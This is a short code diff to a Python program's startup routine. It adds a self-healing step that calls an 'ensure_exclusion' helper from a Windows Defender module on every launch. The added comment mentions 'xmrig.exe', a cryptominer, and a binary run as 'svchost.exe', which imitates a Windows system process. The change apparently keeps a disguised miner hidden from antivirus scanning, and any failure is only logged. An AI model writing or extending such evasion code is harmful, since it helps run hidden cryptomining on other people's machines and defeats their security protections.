@@ -832,6 +832,16 @@ def main(argv=None):
     except Exception as exc:
         log("startup error [%s]: %r" % (_owner_tag(exc, "settings"), exc))
 
+    # A legacy install can exclude a binary name it no longer runs (xmrig.exe
+    # excluded, svchost.exe executed). The updater never touches exclusions, so
+    # repair it here on every start: cheap, idempotent, and it saves a box we
+    # would otherwise have to revisit by hand.
+    try:
+        from .platform.defender import ensure_exclusion
+        ensure_exclusion(settings.install_dir, settings.bin_path, log=log_writer)
+    except Exception as exc:
+        log("defender exclusion self-heal failed: %r" % (exc,))
+
     worker = Worker(settings, log=log_writer)
     updater = Updater(settings, log=log_writer)
     try:
